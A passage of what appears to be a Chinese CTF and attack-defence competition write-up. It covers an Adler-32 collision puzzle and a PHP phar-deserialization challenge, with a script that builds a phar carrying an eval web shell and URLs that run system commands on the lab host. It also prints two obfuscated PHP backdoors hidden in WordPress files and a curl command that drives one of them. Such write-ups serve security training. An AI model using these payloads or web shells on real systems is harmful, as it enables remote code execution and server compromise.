class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.denied&gt;#result::before &#123;</span></span><br><span class="line"><span class="undefined">  content: "Access Denied";</span></span><br><span class="line"><span class="undefined">  color: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">#content &#123;</span></span><br><span class="line"><span class="undefined">  display: none;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">body.granted #content &#123;</span></span><br><span class="line"><span class="undefined">  display: initial;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">@keyframes spin &#123;</span></span><br><span class="line"><span class="undefined">  from &#123; transform: rotateY(0); &#125;</span></span><br><span class="line"><span class="undefined">  to &#123; transform: rotateY(360deg); &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube &#123;</span></span><br><span class="line"><span class="undefined">  animation: spin 20s infinite linear;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.cube div &#123;</span></span><br><span class="line"><span class="undefined">  position: absolute;</span></span><br><span class="line"><span class="undefined">  width: 200px;</span></span><br><span class="line"><span class="undefined">  height: 200px;</span></span><br><span class="line"><span class="undefined">  background: rgba(0, 0, 0, 0.51);</span></span><br><span class="line"><span class="undefined">  box-shadow: inset 0 0 60px white;</span></span><br><span class="line"><span class="undefined">  font-size: 20px;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  line-height: 200px;</span></span><br><span class="line"><span class="undefined">  color: rgba(0,0,0,0.5);</span></span><br><span class="line"><span class="undefined">  font-family: sans-serif;</span></span><br><span class="line"><span class="undefined">  text-transform: uppercase;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">adler32</span>(<span class="params">str</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">0</span>, L = str.length, M = <span class="number">0</span>, c = <span class="number">0</span>, d = <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; L;) &#123;</span></span><br><span class="line"><span class="javascript">        M = <span class="built_in">Math</span>.min(L - i, <span class="number">3850</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">while</span> (M &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">            c = str.charCodeAt(i++);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (c &lt; <span class="number">0x80</span>) &#123; a += c; &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">else</span> <span class="keyword">if</span> (c &lt; <span class="number">0x800</span>) &#123;</span></span><br><span class="line"><span class="undefined">                a += 192 | ((c &gt;&gt; 6) &amp; 31); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c &gt;= <span class="number">0xD800</span> &amp;&amp; c &lt; <span class="number">0xE000</span>) &#123;</span></span><br><span class="line"><span class="undefined">                c = (c &amp; 1023) + 64; d = str.charCodeAt(i++) &amp; 1023;</span></span><br><span class="line"><span class="undefined">                a += 240 | ((c &gt;&gt; 8) &amp; 7); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 2) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((d &gt;&gt; 6) &amp; 15) | ((c &amp; 3) &lt;&lt; 4); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (d &amp; 63);</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="undefined">                a += 224 | ((c &gt;&gt; 12) &amp; 15); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | ((c &gt;&gt; 6) &amp; 63); b += a; --M;</span></span><br><span class="line"><span class="undefined">                a += 128 | (c &amp; 63);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">            b += a; --M;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">        a = (15 * (a &gt;&gt;&gt; 16) + (a &amp; 65535));</span></span><br><span class="line"><span class="undefined">        b = (15 * (b &gt;&gt;&gt; 16) + (b &amp; 65535));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">х</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span>(х!=<span class="string">"0x0201"</span>&amp;&amp;adler32(х)==adler32(<span class="string">"0x0201"</span>))&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">open_safe</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  keyhole.disabled = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">  password = <span class="regexp">/^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span>.exec(keyhole.value);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">if</span> (!password || !check(password[<span class="number">1</span>])) <span class="keyword">return</span> <span class="built_in">document</span>.body.className = <span class="string">'denied'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.className = <span class="string">'granted'</span>;</span></span><br><span class="line"><span class="javascript">  content.value = 	<span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"keyhole"</span> <span class="attr">autofocus</span> <span class="attr">onchange</span>=<span class="string">"open_safe()"</span> <span class="attr">placeholder</span>=<span class="string">"🔑"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"result"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h4><p>显然密码正确后输出的conten.value是一个压缩包反转后的内容，提取得到压缩包发现加密，猜测密码要能走通JS逻辑。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">"\x00\x00\x00\x00\x00\x83\x00\x00\x00N\x00\x01\x00\x01\x00\x00\x00\x00\x06\x05KP\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\x8d\x03\x00\x05TUtxt.galf\x00\x00\x00\x00\x81\xa4\x00\x00\x00\x01\x00\x00\x00\x00\x00\x18\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x03\x1e\x02\x01KP\x00\x00\x00%\x00\x00\x001=\x16\x04\x0c\x08\x07KP\x045R\tM\xc2\xde\x14sg\x92\xd0K\xbfh\x9c\x08\xeb\xf3@\x9d\x00\x14\x8b^\xfb\xa5\x96O\xc0\xdd\x8a(\xe6\x0c\x92\x1e \xad\x86\xa6@\xbc@J=\x11Z\xfe\x00\x00\x00\x00\x04\x00\x00\x00\x00\x04\x01\x00\x0bxu[\xd1\x9e\xfb[\xd1\x9e\x8d\x03\x00\tTUtxt.galf\x00\x1c\x00\x08\x00\x00\x00%\x00\x00\x001=\x16\x04\x0cMY\x95\x8f\x00\x00\x00\t\x00\n\x04\x03KP"</span></span><br><span class="line">f=open(<span class="string">'extract.zip'</span>,<span class="string">'wb'</span>).write(s[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
<p>使用JavaScript爆破密码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec2hexString</span>(<span class="params">dec</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (dec+<span class="number">0x10000</span>).toString(<span class="number">16</span>).substr(<span class="number">-4</span>).toUpperCase();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bruteforce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">0xffff</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(check(dec2hexString(i)))<span class="built_in">console</span>.log(<span class="string">"password&#123;"</span>+dec2hexString(i)+<span class="string">"&#125;"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">bruteforce()</span><br><span class="line"><span class="comment">// password&#123;0x0120&#125; √</span></span><br><span class="line"><span class="comment">// password&#123;0x1011&#125; ×</span></span><br></pre></td></tr></table></figure>
<p>或者使用python爆破：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /^password&#123;([0-9a-zA-Z_@!?-]+)&#125;$/</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adler32</span><span class="params">(s)</span>:</span></span><br><span class="line">    i=<span class="number">0</span>;a=<span class="number">1</span>;b=<span class="number">0</span>;M=<span class="number">0</span>;c=<span class="number">0</span>;d=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i&lt;len(s):</span><br><span class="line">        M=min(len(s)-i,<span class="number">3850</span>)</span><br><span class="line">        <span class="keyword">while</span> M&gt;<span class="number">0</span>:</span><br><span class="line">            c=ord(s[i]);i+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> c&lt; <span class="number">0x80</span>:</span><br><span class="line">                a+=c</span><br><span class="line">            <span class="keyword">elif</span> c&gt;<span class="number">0xd800</span> <span class="keyword">and</span> c &lt; <span class="number">0xe000</span>:</span><br><span class="line">                c= (c &amp; <span class="number">1023</span>) +<span class="number">64</span> ;d = s[i]&amp;<span class="number">1023</span>;i+=<span class="number">1</span></span><br><span class="line">                a+=<span class="number">240</span> | ((c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">7</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">63</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((d &gt;&gt; <span class="number">6</span>) &amp; <span class="number">15</span>) | ((c &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>); b += a; M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (d &amp; <span class="number">63</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a += <span class="number">224</span> | ((c &gt;&gt; <span class="number">12</span>) &amp; <span class="number">15</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | ((c &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>); b += a;M-=<span class="number">1</span></span><br><span class="line">                a += <span class="number">128</span> | (c &amp; <span class="number">63</span>)</span><br><span class="line">            b+=a;M-=<span class="number">1</span></span><br><span class="line">        a = (<span class="number">15</span> * (a &gt;&gt; <span class="number">16</span>) + (a &amp; <span class="number">65535</span>))</span><br><span class="line">        b = (<span class="number">15</span> * (b &gt;&gt; <span class="number">16</span>) + (b &amp; <span class="number">65535</span>))</span><br><span class="line">    <span class="keyword">return</span> ((b % <span class="number">65521</span>) &lt;&lt; <span class="number">16</span>) | (a % <span class="number">65521</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="string">'0123456789'</span>,repeat=<span class="number">4</span>):</span><br><span class="line">    p=<span class="string">'0x'</span>+<span class="string">''</span>.join(i)</span><br><span class="line">    <span class="keyword">if</span> adler32(p)==adler32(<span class="string">'0x0201'</span>):</span><br><span class="line">        <span class="keyword">print</span> p,</span><br><span class="line">        <span class="comment"># [0x0120] 0x0201 0x1011</span></span><br></pre></td></tr></table></figure>
<p>密码为<code>password{0x0120}</code> ，解压得到flag。<code>flag{cjvf33_98hfi3_jfh3_dsh93h_f3had}</code> 。</p>
<h3 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h3><p>给了1321个TXT，每个文件一个字符，内容如下。提示时间戳，没搞懂要干啥。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ./*</span><br><span class="line">Money is not evil by itself.Its just paper with perceived value to obtain other things we value <span class="keyword">in</span> other ways.If not money - what is. evil you may ask?Evil is the unquenchable, obsessive and moral bending desire <span class="keyword">for</span> more.Evil is the bottomless, soulless and obsessive-compulsive pursuit of some pot of gold.at the end of some rainbow <span class="built_in">which</span> doesn<span class="string">'t exist.Evil is having a price tag for your heart and soul in exchange for financial success at any cost.Evil is trying to buy happiness, again and again.until all of those fake, short lived mirages of emotions are gone.Make more time.I'</span>m not saying you can<span class="string">'t be financially successful.I'</span>m saying have a greater purpose <span class="keyword">in</span> life well beyond the pursuit of financial success.Your soul is screaming <span class="keyword">for</span> you to answer your <span class="literal">true</span> calling.You can change today <span class="keyword">if</span> you redefine what success is to you.You can transform your damaged relationships and build new ones.You can forgive yourself and others who<span class="string">'ve hurt you.You can become a leader by mentoring with others who you aspire to be like.You can re-balance your priorities in life.You can heal your marriage and recreate a stronger love than you ever thought possible.You can become the best parent possible at any age - even 86.but don'</span>t <span class="built_in">wait</span> until then...You will always be able to make more money.But you cannot make more time.</span><br></pre></td></tr></table></figure>
<p>记录一个获取文件时间的方式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">a=subprocess.check_output((<span class="string">"stat"</span>,<span class="string">"-c"</span>, <span class="string">"%y"</span>, file_name))</span><br></pre></td></tr></table></figure>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>万能密码</p>
<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>主页CTRL+U，发现源码泄露。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://172.16.17.2/file_aq12ws.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "hahaha";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是前段时间black hat上提到的利用phar伪协议在一些文件系统函数中触发反序列化漏洞。</p>
<p>phar文件本质上是一个压缩文件，在manifest部分存放每个被压缩文件的权限、属性等信息和用户自定义的meta-data数据，后者是以序列化后的形式存在的。而PHP中大部分文件系统函数在通过 <code>phar://</code> 伪协议解析phar文件时，都会将meta-data反序列化。因此就有了本题的反序列化触发点file_exists函数。除了file_exists还有下图所示的函数，详见 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a> 。</p>
<p><img src="17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt="img"></p>
<p>所以本题的思路是先生成一个meta-data中包含恶意object的phar文件，然后通过上传点上传该文件得到路径，再在 <code>file_aq12ws.php</code> 通过filename参数以<code>phar://</code> 方式包含该文件，就将在file_exists函数处触发phar文件的meta-data的反序列化，就可以得到一个web shell。</p>
<p>要生成phar文件，需要 phar.readonly 为Off，即值为0。而出于安全性考虑，该项默认使能，值为1。当php.ini文件中的phar.readonly值为0时，可以使用ini_set在脚本中设为1或0；当值为1时，只能通过修改php.ini文件来修改值而不能通过脚本修改。也就是说，我们需要在生成phar文件前修改php.ini中phar.readonly值的Off。详细说明见 <a href="http://php.net/manual/en/phar.configuration.php#ini.phar.readonly" target="_blank" rel="noopener">文档</a> 。</p>
<p>生成phar包的代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'@eval($_GET["cmd"]);'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $evil_object=<span class="keyword">new</span> MyClass();<span class="comment">//生成恶意对象</span></span><br><span class="line"></span><br><span class="line">    $file_name=<span class="string">"test.phar"</span>;<span class="comment">//后缀必须为phar</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists($file_name))unlink(<span class="string">'test.phar'</span>);<span class="comment">//删除当前目录下已有的phar包</span></span><br><span class="line">    $phar=<span class="keyword">new</span> Phar($file_name);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub，可理解为phar文件的标志</span></span><br><span class="line">    $phar-&gt;setMetadata($evil_object);<span class="comment">//将恶意对象作为自定义的meta-data传入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);<span class="comment">//添加压缩文件及其内容</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
<p>访问该代码后目录下会生成<code>test.phar</code> 文件，重命名为<code>test.gif</code> ，上传后访问 <code>target.ip/file_aq12ws.php?filename=phar://test.gif&amp;cmd=phpinfo();</code> 见到phpinfo页面就说明成功了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ xxd test.phar</span><br><span class="line">00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  &lt;?php __HALT_COM</span><br><span class="line">00000010: 5049 4c45 5228 293b 203f 3e0d 0a70 0000  PILER(); ?&gt;..p..</span><br><span class="line">00000020: 0001 0000 0011 0000 0001 0000 0000 003b  ...............;</span><br><span class="line">00000030: 0000 004f 3a37 3a22 4d79 436c 6173 7322  ...O:7:<span class="string">"MyClass"</span></span><br><span class="line">00000040: 3a31 3a7b 733a 363a 226f 7574 7075 7422  :1:&#123;s:6:<span class="string">"output"</span></span><br><span class="line">00000050: 3b73 3a32 303a 2240 6576 616c 2824 5f47  ;s:20:<span class="string">"@eval(<span class="variable">$_G</span></span></span><br><span class="line"><span class="string">00000060: 4554 5b22 636d 6422 5d29 3b22 3b7d 0700  ET["</span>cmd<span class="string">"]);"</span>;&#125;..</span><br><span class="line">00000070: 0000 666f 6f2e 7478 7403 0000 000a 5ffb  ..foo.txt....._.</span><br><span class="line">00000080: 5b03 0000 00aa 8cff 76b6 0100 0000 0000  [.......v.......</span><br><span class="line">00000090: 0062 6172 7533 2162 c819 a6d5 6019 ab22  .baru3!b....`..<span class="string">"</span></span><br><span class="line"><span class="string">000000a0: 7e2e f1df 96d7 b375 0200 0000 4742 4d42  ~......u....GBMB</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('find / | grep flag');</span></span><br><span class="line">http:<span class="comment">//172.16.17.2/file_aq12ws.php?filename=phar://upload_file/phphphar2.gif&amp;a=system('cat /var/www/html/sdf3r_df3erdf/flag.txt');</span></span><br><span class="line">flag&#123;qwe3_89fdsf3_jjnj3ioxc_ozxov&#125;</span><br></pre></td></tr></table></figure>
<h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><p><strong>attack</strong> </p>
<p>一上来D盾扫出几个后门。用其中一个连了菜刀，在<code>E:\wwwroot\RequestFlag\</code> 发现<code>url.bat</code> ，内容为：<code>curl.exe https://FlagServer.com:9000/flag --cacert ca.crt --cert client.crt --key client.key</code> ，在目标机上执行该命令可以得到对方flag。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://172.16.18.13/wordpress/wp-includes/customize/class-wp-customize-background-image-list.php"</span> -d <span class="string">"-7=system('E:\wwwroot\RequestFlag\curl.exe https://FlagServer.com:9000/flag --cacert E:\wwwroot\RequestFlag\ca.crt --cert E:\wwwroot\RequestFlag\client.crt --key E:\wwwroot\RequestFlag\client.key');"</span></span><br></pre></td></tr></table></figure>
<p>用的木马是<code>wwwroot\wordpress\wp-includes\customize\class-wp-customize-background-image-list.php</code>  ，相当于<code>@assert(${_POST}[-7]);</code> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@$_ = <span class="string">"s"</span> . <span class="string">"s"</span> . <span class="comment">/*-/*-*/</span><span class="string">"e"</span> . <span class="comment">/*-/*-*/</span><span class="string">"r"</span>;</span><br><span class="line">@$_ = <span class="comment">/*-/*-*/</span><span class="string">"a"</span> . <span class="comment">/*-/*-*/</span>$_ . <span class="comment">/*-/*-*/</span><span class="string">"t"</span>;</span><br><span class="line">@$_<span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">"_P"</span> . <span class="comment">/*-/*-*/</span><span class="string">"OS"</span> . <span class="comment">/*-/*-*/</span><span class="string">"T"</span>&#125;</span><br><span class="line">	[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span> - <span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>]);</span><br></pre></td></tr></table></figure>
<p>在WAF上配了一些敏感字符正则后观察日志，发现另一个大家用的比较多的后门，<code>wwwroot\wordpress\wp-includes\pomo\tp.php</code> ，等价于<code>@ASsERT(eval(@$_POST[cmd]));</code> 。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125; = (<span class="string">"!"</span> ^ <span class="string">"`"</span>) . (<span class="string">"( "</span> ^ <span class="string">"&#123;"</span>) . (<span class="string">"("</span> ^ <span class="string">"["</span>) . (<span class="string">"~"</span> ^ <span class="string">";"</span>) . (<span class="string">"|"</span> ^ <span class="string">"."</span>) . (<span class="string">"*"</span> ^ <span class="string">"~"</span>);</span><br><span class="line">@$&#123;(<span class="string">"#"</span> ^ <span class="string">"|"</span>) . (<span class="string">"#"</span> ^ <span class="string">"|"</span>)&#125;((<span class="string">"-"</span> ^ <span class="string">"H"</span>) . (<span class="string">"]"</span> ^ <span class="string">"+"</span>) . (<span class="string">"["</span> ^ <span class="string">":"</span>) . (<span class="string">","</span> ^ <span class="string">"@"</span>) . (<span class="string">"&#125;"</span> ^ <span class="string">"U"</span>) . (<span class="string">"~"</span> ^ <span class="string">"&gt;"</span>) . (<span class="string">"e"</span> ^ <span class="string">"A"</span>) . (<span class="string">"("</span> ^ <span class="string">"w"</span>) . (<span class="string">"j"</span> ^ <span class="string">":"</span>) . (<span class="string">"i"</span> ^ <span class="string">"&amp;"</span>) . (<span class="string">"#"</span> ^ <span 